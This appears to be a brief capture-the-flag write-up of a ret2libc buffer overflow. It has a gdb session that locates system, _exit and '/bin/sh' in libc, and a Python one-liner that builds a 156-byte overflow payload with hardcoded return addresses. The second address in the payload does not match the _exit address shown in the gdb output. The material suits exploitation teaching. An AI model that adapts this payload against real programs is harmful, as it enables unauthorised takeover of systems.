## Buffer Overflow

We observe that the gets function reads input and stores it into a variable allocated with 0x80 (128 bytes).
```
...
(gdb) p system
$2 = {<text variable, no debug info>} 0xf7e6aed0 <system>
(gdb) p _exit
$3 = {<text variable, no debug info>} 0xf7ee45c4 <_exit>
(gdb) info proc mappings
process 1978
Mapped address spaces:
    ...
    Start Addr   End Addr       Size     Offset objfile
    ...
    0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so
    ...
(gdb) find 0xf7e2c000, 0xf7fcc000, "/bin/sh"
0xf7f897ec
1 pattern found.
(gdb)
```
## GDB

The following command in GDB allows you to debug the child process:

set follow-fork-mode child

## Generated Payload

We can generate the payload using the following command:

python -c 'print "A" * 156 + "\xd0\xae\xe6\xf7" + "\x70\xeb\xe5\xf7" + "\xec\x97\xf8\xf7"' > /tmp/payload